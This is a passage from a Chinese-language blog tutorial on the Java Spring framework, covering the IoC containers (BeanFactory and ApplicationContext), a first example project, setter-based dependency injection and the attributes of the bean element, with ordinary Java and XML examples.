<td>Spring 提供在基础 IoC 功能上的扩展服务，此外还提供许多企业级服务的支持，如邮件服务、任务调度、JNDI 定位、EJB 集成、远程访问、缓存以及各种视图层框架的封装等</td>
</tr>
<tr>
<td>spring-expression-3.2.13.RELEASE.jar</td>
<td>定义了 Spring 的表达式语言。 需要注意的是，在使用 Spring 开发时，除了 Spring 自带的 JAR 包以外，还需要一个第三方 JAR 包 commons.logging 处理日志信息</td>
</tr>
</tbody></table>
<p>读者可以通过网址 <a href="http://commons.apache.org/proper/commons-logging/download_logging.cgi" target="_blank" rel="noopener">http://commons.apache.org/proper/commons-logging/download_logging.cgi</a> 下载。该 JAR 包现在最新版本为 commons-logging.1.2，下载完成后，解压即可找到。</p>
<p>使用 Spring 框架时，只需将 Spring 的四个基础包以及 commons-logging-1.2.jar 包复制到项目的 lib 目录，并发布到类路径中即可。</p>
<h1 id="Ⅳ、Spring-框架中的Ioc容器：BeanFactory-和-ApplicationContext"><a href="#Ⅳ、Spring-框架中的Ioc容器：BeanFactory-和-ApplicationContext" class="headerlink" title="Ⅳ、Spring 框架中的Ioc容器：BeanFactory 和 ApplicationContext"></a>Ⅳ、Spring 框架中的Ioc容器：BeanFactory 和 ApplicationContext</h1><h3 id="1、容器"><a href="#1、容器" class="headerlink" title="1、容器"></a>1、容器</h3><p>在Java当中，如果有一个类专门用来存放其它类的对象，这个类就叫做容器，或者就叫做集合，集合就是将若干性质相同或相近的类对象组合在一起而形成的一个整体</p>
<p><img data-src="https://i.loli.net/2021/01/23/uS7KM5oGc2ZNpUW.png" alt></p>
<h3 id="2、Java-Spring-中的容器"><a href="#2、Java-Spring-中的容器" class="headerlink" title="2、Java Spring 中的容器"></a>2、Java Spring 中的容器</h3><p>在最开始的时候已经介绍过了 Spring IoC （Inversion of Control，控制反转），即指在程序开发中，实例的创建不再由调用者管理，而是由 Spring 容器进行创建。Spring 容器会负责控制程序之间的关系，而不是由程序代码直接控制，因此，控制权由程序代码转移到了 Spring 容器中，控制权发生了反转，这就是 Spring 的 IoC 思想。</p>
<p>Spring 提供了两种 IoC 容器，分别为 BeanFactory 和 ApplicationContext，接下来将针对这两种 IoC 容器进行详细讲解。</p>
<h4 id="BeanFactory"><a href="#BeanFactory" class="headerlink" title="BeanFactory"></a>BeanFactory</h4><p>BeanFactory 是基础类型的 IoC 容器，它由 org.springframework.beans.facytory.BeanFactory 接口定义，并提供了完整的 IoC 服务支持。简单来说，BeanFactory 就是一个管理 Bean 的工厂，它主要负责初始化各种 Bean，并调用它们的生命周期方法。</p>
<p>BeanFactory 接口有多个实现类，最常见的是 org.springframework.beans.factory.xml.XmlBeanFactory，它是根据 XML 配置文件中的定义装配 Bean 的。</p>
<p>创建 BeanFactory 实例时，需要提供 Spring 所管理容器的详细配置信息，这些信息通常采用 XML 文件形式管理。其加载配置信息的代码具体如下所示：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">BeanFactory beanFactory = <span class="keyword">new</span> XmlBeanFactory(<span class="keyword">new</span> FileSystemResource(<span class="string">"D://applicationContext.xml"</span>));</span><br></pre></td></tr></table></figure>

<h4 id="ApplicationContext"><a href="#ApplicationContext" class="headerlink" title="ApplicationContext"></a>ApplicationContext</h4><p>ApplicationContext 是 BeanFactory 的子接口，也被称为应用上下文。该接口的全路径为 org.springframework.context.ApplicationContext，它不仅提供了 BeanFactory 的所有功能，还添加了对 i18n（国际化）、资源访问、事件传播等方面的良好支持。</p>
<p>ApplicationContext 接口有两个常用的实现类，具体如下。</p>
<h5 id="1）ClassPathXmlApplicationContext"><a href="#1）ClassPathXmlApplicationContext" class="headerlink" title="1）ClassPathXmlApplicationContext"></a>1）ClassPathXmlApplicationContext</h5><p>该类从类路径 ClassPath 中寻找指定的 XML 配置文件，找到并装载完成 ApplicationContext 的实例化工作，具体如下所示。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ApplicationContext applicationContext = <span class="keyword">new</span> ClassPathXmlApplicationContext(String configLocation);</span><br></pre></td></tr></table></figure>



<p>在上述代码中，configLocation 参数用于指定 Spring 配置文件的名称和位置，如 applicationContext.xml。</p>
<h5 id="2）FileSystemXmlApplicationContext"><a href="#2）FileSystemXmlApplicationContext" class="headerlink" title="2）FileSystemXmlApplicationContext"></a>2）FileSystemXmlApplicationContext</h5><p>该类从指定的文件系统路径中寻找指定的 XML 配置文件，找到并装载完成 ApplicationContext 的实例化工作，具体如下所示。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ApplicationContext applicationContext = <span class="keyword">new</span> FileSystemXmlApplicationContext(String configLocation);</span><br></pre></td></tr></table></figure>



<p>它与 ClassPathXmlApplicationContext 的区别是：在读取 Spring 的配置文件时，FileSystemXmlApplicationContext 不再从类路径中读取配置文件，而是通过参数指定配置文件的位置，它可以获取类路径之外的资源，如“F：/workspaces/applicationContext.xml”。</p>
<p>在使用 Spring 框架时，可以通过实例化其中任何一个类创建 Spring 的 ApplicationContext 容器。</p>
<p>通常在 Java 项目中，会采用通过 ClassPathXmlApplicationContext 类实例化 ApplicationContext 容器的方式，而在 Web 项目中，ApplicationContext 容器的实例化工作会交由 Web 服务器完成。Web 服务器实例化 ApplicationContext 容器通常使用基于 ContextLoaderListener 实现的方式，它只需要在 web.xml 中添加如下代码：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--指定Spring配置文件的位置，有多个配置文件时，以逗号分隔--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">context-param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>contextConfigLocation<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--spring将加载spring目录下的applicationContext.xml文件--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param-value</span>&gt;</span></span><br><span class="line">        classpath:spring/applicationContext.xml</span><br><span class="line">    <span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">context-param</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--指定以ContextLoaderListener方式启动Spring容器--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">listener</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">listener-class</span>&gt;</span></span><br><span class="line">        org.springframework.web.context.ContextLoaderListener</span><br><span class="line">    <span class="tag">&lt;/<span class="name">listener-class</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">listener</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>需要注意的是，BeanFactory 和 ApplicationContext 都是通过 XML 配置文件加载 Bean 的。</p>
<p>二者的主要区别在于，如果 Bean 的某一个属性没有注入，则使用 BeanFacotry 加载后，在第一次调用 getBean() 方法时会抛出异常，而 ApplicationContext 则在初始化时自检，这样有利于检查所依赖的属性是否注入。</p>
<p>因此，在实际开发中，通常都选择使用 ApplicationContext，而只有在系统资源较少时，才考虑使用 BeanFactory。本文中使用的就是 ApplicationContext。</p>
<h1 id="Ⅴ、创建第一个-Java-Spring-项目"><a href="#Ⅴ、创建第一个-Java-Spring-项目" class="headerlink" title="Ⅴ、创建第一个 Java Spring 项目"></a>Ⅴ、创建第一个 Java Spring 项目</h1><h3 id="1、导入框架支持"><a href="#1、导入框架支持" class="headerlink" title="1、导入框架支持"></a>1、导入框架支持</h3><p>这里使用的是IDEA，首先新建一个空项目（或者选择以前存在的项目），在项目名右键并选中添加框架的支持</p>
<p><img data-src="https://i.loli.net/2021/01/23/txBjDgqSKadMI94.png" alt="image-20210102131623168"></p>
<p>然后在弹出的选择框里选择Spring，待所有文件下载完毕后，项目目录中会出现 lib 模块</p>
<p><img data-src="https://i.loli.net/2021/01/23/nTrCs81bXwSelU6.png" alt="image-20210102131825454"></p>
<p>至此框架支持已经完成。</p>
<h3 id="2、创建项目"><a href="#2、创建项目" class="headerlink" title="2、创建项目"></a>2、创建项目</h3><p>1）在项目的 src 目录下创建一个名为 com.mengma.ioc 的包，然后在该包中创建一个名为 PersonDao 的接口，并在接口中添加一个 add() 方法，如下所示。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.mengma.ioc;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">PersonDao</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">add</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>2）在 com.mengma.ioc 包下创建 PersonDao 的实现类 PersonDaoImpl，编辑后如下所示。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.mengma.ioc;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PersonDaoImpl</span> <span class="keyword">implements</span> <span class="title">PersonDao</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> num = <span class="number">1</span>;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">add</span><span class="params">()</span> </span>&#123;	<span class="comment">// PersonDaoImpl 类实现了 PersonDao 接口中的 add() 方法，并且在方法调用时会执行输出语句。</span></span><br><span class="line">        System.out.println(<span class="string">"save()执行了..."</span>);</span><br><span class="line">        num ++;</span><br><span class="line">        System.out.println(num);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>3）在 src 目录下创建 Spring 的核心配置文件 applicationContext.xml，编辑后如下所示。</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">"http://www.springframework.org/schema/beans"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span> <span class="attr">xmlns:p</span>=<span class="string">"http://www.springframework.org/schema/p"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://www.springframework.org/schema/beans</span></span></span><br><span class="line"><span class="tag"><span class="string">    http://www.springframework.org/schema/beans/spring-beans-3.2.xsd"</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 由 Spring容器创建该类的实例对象 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"personDao"</span> <span class="attr">class</span>=<span class="string">"com.mengma.ioc.PersonDaoImpl"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>上述代码中，第 2～5 行代码是 Spring 的约束配置，第 7 行代码表示在 Spring 容器中创建一个 id 为 personDao 的 bean 实例，其中 id 表示文件中的唯一标识符，class 属性表示指定需要实例化 Bean 的实全限定类名（包名+类名）。</p>
<p>需要注意的是，Spring 的配置文件名称是可以自定义的，通常情况下，都会将配置文件命名为 applicationContext.xml（或 bean.xml）。</p>
<p>4）在 com.mengma.ioc 包下创建测试类 FirstTest，并在该类中添加一个名为 test1() 的方法，编辑后如下所示。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.mengma.ioc;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.junit.Test;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.ApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.support.ClassPathXmlApplicationContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FirstTest</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testl</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 定义Spring配置文件的路径</span></span><br><span class="line">        String xmlPath = <span class="string">"applicationContext.xml"</span>;</span><br><span class="line">        <span class="comment">// 初始化Spring容器，加载配置文件</span></span><br><span class="line">        ApplicationContext applicationContext = <span class="keyword">new</span> ClassPathXmlApplicationContext(</span><br><span class="line">                xmlPath);</span><br><span class="line">        <span class="comment">// 通过容器获取personDao实例</span></span><br><span class="line">        PersonDao personDao = (PersonDao) applicationContext</span><br><span class="line">                .getBean(<span class="string">"personDao"</span>);</span><br><span class="line">        <span class="comment">// 调用 personDao 的 add ()方法</span></span><br><span class="line">        personDao.add();</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 重新获取一次PersonDao实例</span></span><br><span class="line">        PersonDao personDao1 = (PersonDao) applicationContext.getBean(<span class="string">"personDao"</span>);</span><br><span class="line">        personDao1.add();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上述代码中，首先定义了 Spring 配置文件的路径，然后创建 Spring 容器，接下来通过 Spring 容器获取了 personDao 实例，最后调用实例的 save() 方法。</p>
<p>5）运行并查看结果</p>
<p><img data-src="https://i.loli.net/2021/01/23/HBmyuXWLeIUk59R.png" alt="image-20210102142251265"></p>
<p>从输出结果中可以看出，程序已经成功输出了“save()执行了…”语句。在程序执行时，对象的创建并不是通过 new 一个类完成的，而是由 Spring 容器管理实现的。这就是 Spring IoC 容器思想的工作机制。</p>
<h1 id="Ⅵ、Spring-DI（依赖注入）的实现方式：属性注入和构造注入"><a href="#Ⅵ、Spring-DI（依赖注入）的实现方式：属性注入和构造注入" class="headerlink" title="Ⅵ、Spring DI（依赖注入）的实现方式：属性注入和构造注入"></a>Ⅵ、Spring DI（依赖注入）的实现方式：属性注入和构造注入</h1><p>依赖注入（Dependency Injection，DI）和控制反转含义相同，它们是从两个角度描述的同一个概念。</p>
<p>当某个 Java 实例需要另一个 Java 实例时，传统的方法是由调用者创建被调用者的实例（例如，使用 new 关键字获得被调用者实例），而使用 Spring 框架后，被调用者的实例不再由调用者创建，而是由 Spring 容器创建，这称为控制反转。</p>
<p>Spring 容器在创建被调用者的实例时，会自动将调用者需要的对象实例注入给调用者，这样，调用者通过 Spring 容器获得被调用者实例，这称为依赖注入。</p>
<p>Spring 能有效地组织 J2EE 应用各层的对象。不管是控制层的 Action 对象，还是业务层的 Service 对象，还是持久层的 DAO 对象，都可在 Spring 的 管理下有机地协调、运行。Spring 将各层的对象以松耦合的方式组织在一起， Action 对象无须关心 Service 对象的具体实现，Service 对 象无须关心持久层对象的具体实现，各层对象的调用完全面向接口。当系统需要重构时，代码的改写量将大大减少。</p>
<p>上面所说的一切都得宜于 Spring 的核心机制，依赖注入。依赖注入让 bean 与 bean 之间以配置文件组织在一起，而不是以硬编码的方式耦合在一起。理解依赖注入</p>
<p>依赖注入(Dependency Injection)和控制反转(Inversion of Control)是同一个概念。具体含义是:当某个角色(可能是一个 Java 实例，调用者)需要另一个角色(另一个 Java 实例，被调用者)的协助时，在 传统的程序设计过程中，通常由调用者来创建被调用者的实例。但在 Spring 里，创建被调用者的工作不再由调用者来完成，因此称为控制反转;创建被调用者 实例的工作通常由 Spring 容器来完成，然后注入调用者，因此也称为依赖注入。</p>
<p>不管是依赖注入，还是控制反转，都说明 Spring 采用动态、灵活的方式来管理各种对象。对象与对象之间的具体实现互相透明。在理解依赖注入之前，看如下这个问题在各种社会形态里如何解决:一个人( Java 实例，调用者)需要一把斧子( Java 实例，被调用者)。</p>
<p>(1)原始社会里，几乎没有社会分工。需要斧子的人(调用者)只能自己去磨一把斧子(被调用者)。对应的情形为: Java 程序里的调用者自己创建被调用者。</p>
<p>(2)进入工业社会，工厂出现。斧子不再由普通人完成，而在工厂里被生产出来，此时需要斧子的人(调用者)找到工厂，购买斧子，无须关心斧子的制造过程。对应 Java 程序的简单工厂的设计模式。</p>
<p>(3)进入“按需分配”社会，需要斧子的人不需要找到工厂，坐在家里发出一个简单指令:需要斧子。斧子就自然出现在他面前。对应 Spring 的依赖注入。</p>
<p>第一种情况下，Java 实例的调用者创建被调用的 Java 实例，必然要求被调用的 Java 类出现在调用者的代码里。无法实现二者之间的松耦合。</p>
<p>第二种情况下，调用者无须关心被调用者具体实现过程，只需要找到符合某种标准(接口)的实例，即可使用。此时调用的代码面向接口编程，可以让调用者和被调用者解耦，这也是工厂模式大量使用的原因。但调用者需要自己定位工厂，调用者与特定工厂耦合在一起。</p>
<p>第三种情况下，调用者无须自己定位工厂，程序运行到需要被调用者时，系统自动提供被调用者实例。事实上，调用者和被调用者都处于 Spring 的管理下，二者之间的依赖关系由 Spring 提供。</p>
<p>依赖注入主要有两种实现方式，分别是属性 setter 注入和构造方法注入。具体介绍如下。</p>
<h2 id="1、属性-setter-注入"><a href="#1、属性-setter-注入" class="headerlink" title="1、属性 setter 注入"></a>1、属性 setter 注入</h2><p>指 IoC 容器使用 setter 方法注入被依赖的实例。通过调用无参构造器或无参 static 工厂方法实例化 bean 后，调用该 bean 的 setter 方法，即可实现基于 setter 的 DI。</p>
<h2 id="2、构造方法注入"><a href="#2、构造方法注入" class="headerlink" title="2、构造方法注入"></a>2、构造方法注入</h2><p>指 IoC 容器使用构造方法注入被依赖的实例。基于构造器的 DI 通过调用带参数的构造方法实现，每个参数代表一个依赖。</p>
<h2 id="3、实例"><a href="#3、实例" class="headerlink" title="3、实例"></a>3、实例</h2><p>下面通过属性 setter 注入的案例演示 Spring 容器是如何实现依赖注入的。具体步骤如下。</p>
<p>1） 创建 PersonService 接口</p>
<p>在 springDemo01 项目的 com.mengma.ioc 包下创建一个名为 PersonService 的接口，该接口中包含一个 addPerson() 方法，如下所示。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.mengma.ioc;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">PersonService</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">addPerson</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>2）创建接口实现类 PersonServiceImpl</p>
<p>在 com.mengma.ioc 包下创建一个名为 PersonServiceImpl 的类，该类实现了 PersonService 接口，如下所示。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.mengma.ioc;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PersonServiceImpl</span> <span class="keyword">implements</span> <span class="title">PersonService</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 定义接口声明</span></span><br><span class="line">    <span class="keyword">private</span> PersonDao personDao;	<span class="comment">// 这里声明了一个类型为 PersonDao 的变量，注意后面会用到</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 提供set()方法，用于依赖注入，setter() 方法用于设值注入的依赖注入方式，用 setter() 方法的参数就是设值注入的对象</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setPersonDao</span><span class="params">(PersonDao personDao)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.personDao = personDao;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 实现PersonService接口的方法</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">addPerson</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        personDao.add(); <span class="comment">// 调用PersonDao中的add()方法</span></span><br><span class="line">        System.out.println(<span class="string">"addPerson()执行了..."</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上述代码中，首先声明了 personDao 对象，并为其添加 setter 方法，用于依赖注入，然后实现了 PersonDao 接口的 addPerson() 方法，并在方法中调用 add() 方法和输出一条语句。</p>
<p>3）在 applicationContext.xml 中<strong>添加配置信息</strong>（注意是在前面的基础上添加）</p>
<p>在 applicationContext.xml 配置文件中添加一个 <bean> 元素，用于实例化 PersonServiceImpl 类，并将 personDao 的实例注入到 personService 中，其实现代码如下所示：</bean></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 关于 personDao 的 Bean 实例已经在以前的配置文件基础上创建好了 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"personService"</span> <span class="attr">class</span>=<span class="string">"com.mengma.ioc.PersonServiceImpl"</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 将personDao实例注入personService实例中 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"personDao"</span> <span class="attr">ref</span>=<span class="string">"personDao"</span>/&gt;</span>	</span><br><span class="line">    <span class="comment">&lt;!-- property 属性用来指定需要容器注入的属性，这里的 personDao 属性需要的是设值注入，所以对应的被注入类 PersonServiceImpl 需要 setter 方法，这里的 ref 属性则是指定对 Bean 工厂的 Bean 实例的引用 --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>从这里可以看到，Spring 框架将各个实例之间进行了松耦合，bean 与 bean 实例之间的依赖关系并不是放在具体的实现类当中，而是通过配置文件的指定，让 Spring 精确的为每个 bean 注入属性，添加对另一个 bean 实例的依赖。正因如此，bean 属性的 class 参数不能仅仅是接口，而一定要是一个实现类，即能够实例化。</p>
<p>Spring 会自动接管每个 bean 定义中的 property 元素定义。Spring会在执行无参数的构造器后、创建默认的bean实例后，调用对应 的setter方法为程序注入属性值。property定义的属性值将不再由该bean来主动创建、管理，而改为被动接收Spring的注入。</p>
<p>每个bean的id属性是该bean的惟一标识，程序通过id属性访问bean，bean与bean的依赖关系也通过id属性完成。</p>
<p>当需要修改 PersonDao 类相关信息时，则无需修改与其有联系的 PersonServiceImpl 类 。如：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 如果新建了一个 bean 实例对象，名为 personDao1 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"personService"</span> <span class="attr">class</span>=<span class="string">"com.mengma.ioc.PersonServiceImpl"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"personDao"</span> <span class="attr">ref</span>=<span class="string">"personDao1"</span>/&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 只需要修改注入的 ref 属性值就可以 --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>PersonServiceImpl 与 PersonDao 之间没有任何的代码耦合关系，只有由 Spring 管理的 bean 之间的依赖关系。</p>
<p>4）编写测试方法</p>
<p>在 FirstTest 类中创建一个名为 test2() 的方法，编辑后如下所示：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test2</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 定义Spring配置文件的路径</span></span><br><span class="line">    String xmlPath = <span class="string">"applicationContext.xml"</span>;</span><br><span class="line">    <span class="comment">// 初始化Spring容器，加载配置文件</span></span><br><span class="line">    ApplicationContext applicationContext = <span class="keyword">new</span> ClassPathXmlApplicationContext(</span><br><span class="line">            xmlPath);</span><br><span class="line">    <span class="comment">// 通过容器获取personService实例</span></span><br><span class="line">    PersonService personService = (PersonService) applicationContext</span><br><span class="line">            .getBean(<span class="string">"personService"</span>);</span><br><span class="line">    <span class="comment">// 调用personService的addPerson()方法</span></span><br><span class="line">    personService.addPerson();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>5）运行查看</p>
<p><img data-src="https://i.loli.net/2021/01/23/ekPzYO8GLfFtmu4.png" alt="运行结果"></p>
<p>从输出结果中可以看出，使用 Spring 容器获取 userService 的实例后，调用了该实例的 addPerson() 方法，在该方法中又调用了 PersonDao 实现类中的 add() 方法，并输出了结果。这就是 Spring 容器属性 setter 注入的方式，也是实际开发中较为常用的一种方式。</p>
<h1 id="Ⅶ、Spring-Bean的配置及常用属性"><a href="#Ⅶ、Spring-Bean的配置及常用属性" class="headerlink" title="Ⅶ、Spring Bean的配置及常用属性"></a>Ⅶ、Spring Bean的配置及常用属性</h1><p>作为 Spring 核心机制的依赖注入，改变了传统的编程习惯，对组件的实例化不再由应用程序完成，转而交由 Spring 容器完成，在需要时注入应用程序中，从而对组件之间依赖关系进行了解耦。这一切都离不开 Spring 配置文件中使用的 <bean> 元素。</bean></p>
<p>Spring 容器可以被看作一个大工厂，而 Spring 容器中的 Bean 就相当于该工厂的产品。如果希望这个大工厂能够生产和管理 Bean，这时则需要告诉容器需要哪些 Bean，以及需要以何种方式将这些 Bean 装配到一起。</p>
<p>Spring 配置文件支持两种不同的格式，分别是 XML 文件格式和 Properties 文件格式。</p>
<p>通常情况下，Spring 会以 XML 文件格式作为 Spring 的配置文件，这种配置方式通过 XML 文件注册并管理 Bean 之间的依赖关系。</p>
<p>XML 格式配置文件的根元素是 <beans>，该元素包含了多个 <bean> 子元素，每一个 <bean> 子元素定义了一个 Bean，并描述了该 Bean 如何被装配到 Spring 容器中。</bean></bean></beans></p>
<p>定义 Bean 的示例代码如下所示：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">"http://www.springframework.org/schema/beans"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span> <span class="attr">xmlns:p</span>=<span class="string">"http://www.springframework.org/schema/p"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://www.springframework.org/schema/beans</span></span></span><br><span class="line"><span class="tag"><span class="string">    http://www.springframework.org/schema/beans/spring-beans-3.2.xsd"</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 使用id属性定义person1，其对应的实现类为com.mengma.person1 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"person1"</span> <span class="attr">class</span>=<span class="string">"com.mengma.damain.Person1"</span> /&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--使用name属性定义person2，其对应的实现类为com.mengma.domain.Person2--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">name</span>=<span class="string">"Person2"</span> <span class="attr">class</span>=<span class="string">"com.mengma.domain.Person2"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>在上述代码中，分别使用 id 和 name 属性定义了两个 Bean，并使用 class 元素指定了 Bean 对应的实现类。</p>
<p><bean> 元素中包含很多属性，其常用属性如下表所示。</bean></p>
<table>
<thead>
<tr>
<th>属性名称</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>id</td>
<td>是一个 Bean 的唯一标识符，Spring 容器对 Bean 的配置和管理都通过该属性完成</td>
</tr>
<tr>
<td>name</td>
<td>Spring 容器同样可以通过此属性对容器中的 Bean 进行配置和管理，name 属性中可以为 Bean 指定多个名称，每个名称之间用逗号或分号隔开</td>
</tr>
<tr>
<td>class</td>
<td>该属性指定了 Bean 的具体实现类，它必须是一个完整的类名，使用类的全限定名</td>
</tr>
<tr>
<td>scope</td>
<td>用于设定 Bean 实例的作用域，其属性值有 singleton（单例）、prototype（原型）、request、session 和 global Session。其默认值是 singleton</td>
</tr>
<tr>
<td>constructor-arg</td>
<td><bean>元素的子元素，可以使用此元素传入构造参数进行实例化。该元素的 index 属性指定构造参数的序号（从 0 开始），type 属性指定构造参数的类型</bean></td>
</tr>
<tr>
<td>property</td>
<td><bean>元素的子元素，用于调用 Bean 实例中的 Set 方法完成属性赋值，从而完成依赖注入。该元素的 name 属性指定 Bean 实例中的相应属性名</bean></td>
</tr>
<tr>
<td>ref</td>
<td><property> 和 <constructor-arg> 等元素的子元素，该元素中的 bean 属性用于指定对 Bean 工厂中某个 Bean 实例的引用</constructor-arg></property></td>
</tr>
<tr>
<td>value</td>
<td><property> 和 <constractor-arg> 等元素的子元素，用于直接指定一个常量值</constractor-arg></property></td>
</tr>
<tr>
<td>list</td>
<td>用于封装 List 或数组类型的依赖注入</td>
</tr>
<tr>
<td>set</td>
<td>用于封装 Set 类型属性的依赖注入</td>
</tr>
<tr>
<td>map</td>
<td>用于封装 Map 类型属性的依赖注入</td>
</tr>
<tr>
<td>entry</td>
<td><map> 元素的子元素，用于设置一个键值对。其 key 属性指定字符串类型的键值，ref 或 value 子元素指定其值</map></td>
</tr>
</tbody></table>
<h1 id="Ⅷ、Spring实例化Bean的三种方法"><a href="#Ⅷ、Spring实例化Bean的三种方法" class="headerlink" title="Ⅷ、Spring实例化Bean的三种方法"></a>Ⅷ、Spring实例化Bean的三种方法</h1><p>在面向对象的程序中，要想调用某个类的成员方法，就需要先实例化该类的对象。在 Spring 中，实例化 Bean 有三种方式，分别是构造器实例化、静态工厂方式实例化和实例工厂方式实例化。本节将针对这三种方式分别进行讲解。</p>
